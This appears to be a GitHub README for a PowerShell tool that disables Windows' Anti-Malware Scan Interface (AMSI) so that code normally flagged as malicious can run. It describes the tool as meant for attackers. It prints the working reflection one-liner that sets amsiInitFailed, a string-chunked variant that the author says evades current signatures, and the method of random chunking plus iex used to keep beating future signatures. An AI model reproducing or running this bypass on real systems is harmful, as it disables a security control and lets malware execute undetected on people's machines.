
# AMSI-Exec

## Purpose:

This repository hosts the Invoke-AMSIExec script which is geared to create a signature bypass in order to disable the Anti-Malware Scan Interface. With AMSI disabled, an attacker can run code which would normally be flagged as malicious within that powershell session.

## Background information:

### Credit where credit is due:

While researching this topic, I came across MDSec's article on a one-liner command that allows you to disable AMSI in the current instance of powershell and have the capability to use scripts that are generally flagged as malicious. In their article they attribute the initial discovery of this one-liner method to a tweet from Matt Graeber (@mattinfestation), and this command will be the baseline for what the script attempts to recreate while breaking the signature.

For more information on their work, a link to MDSec's article is listed in the References section.

### My understanding of current detection methods:

When working with the bypass methods given in the article stated, I saw that the examples in the article worked on test environments where my signature definitions were out of date but not on an updated production workstation. Playing with the command and the inputs, it is apparent that there are still bypass methods available and all it takes to find one that works is some understanding of how the command is currently checked. At the point in time when this was written, Powershell seemed to be checking each input line for substrings that matched the 'signature' for this malicious code. It was observed that the detection for substrings occurs on any input to powershell, even outside of a function call. To illustrate this, entering the following comment line into a powershell session will return an error that malicious content has been blocked.

```
#[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Finding the Signature:

Though this code is a comment, and provides no real execution it is still passed through AMSI and tested. Because a substring of this matches the signature, an error is returned. Working off of this, I broke down the command into parts small enough to where I could find the actual components that were detected as malicious. The two smallest components that I was able to find were the substrings 'AmsiUtils' and 'amsiInitFailed'. An easy way to check this is to take those strings and enter them as standalone comments in a powershell session (with AMSI enabled).

```
# This will cause an error:
# AmsiUtils
# This will show as an acceptable line of code:
# AmsiUtil

# This will also cause an error:
# amsiInitFailed
# And now a broken signature:
# amsiInitFaile

# Please note to recreate this, enter one line of comment at a time.
```

### Breaking the Signature and retain function:

Now that we know what doesn't work and why, we can start working on what does work. From the snippet of code given above, it is clear that any string that is less than 'AmsiUtils' or 'amsiInitFailed' should be treated as a valid entry in powershell. Some of the methods in the MDSec article outlined changing things such as the double-quotes vs the single quotes. Those methods do work on the outdated signature definitions that I was working on, but I found that those were being detected on my production machine. A crude method I tried next worked, which entailed breaking up the signatures into chunked portions of themselves. The command used now looked like the following.

```
[Ref].Assembly.GetType('System.Management.Automation.' + 'A' + 'm' + 's' + 'i' + 'Utils').GetField('a' + 'm' + 's' + 'i' + 'InitFailed','NonPublic,Static').SetValue($null,$true)
```

At the time of writing this article, doing this still breaks the signature easily because the substring is not entered and this should be sufficient. Going a step further on this however, this string could also eventually be entered into the signature database and could again lead to detection. The next step I took was to put together the short script Invoke-AmsiExec.ps1. The script is comprised of two functions: Invoke-AmsiExec and Invoke-ChunkString.

### Automation of different signatures:

Using the Invoke-AmsiExec.ps1 script we take the values for each of the functions called within our bypass command and store them as their own strings. Those strings are then passed to the Invoke-ChunkString function to return an array of substrings that when joined create the original string. For example, "QWERTY" would be broken down into chunks such as ['Q', 'WE', 'R', 'TY'] and we could use the -join '' functionality to get the original string back without explicitly entering 'QWERTY'.  The Invoke-ChunkString function creates chunks of varying sizes (defaulted to 6) to ensure that we have at least broken down the shortest signature which has a length of 8. Upon receiving the arrays with the string content, they are passed to an iex statement that recreates the parts of the original command that cannot be a part of a signature. Because they are the names of functions and not user defined inputs, it is not likely that they will add these parts to a signature database. For example, it is less likely that they will take away the function GetField(), but more likely that they will check the input you provide to it. A link to the source code can be found [here](https://github.com/jakehomb/AMSI-Exec/blob/master/Invoke-AmsiExec.ps1).



## References
[MDSec's write up on AMSI Bypass](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
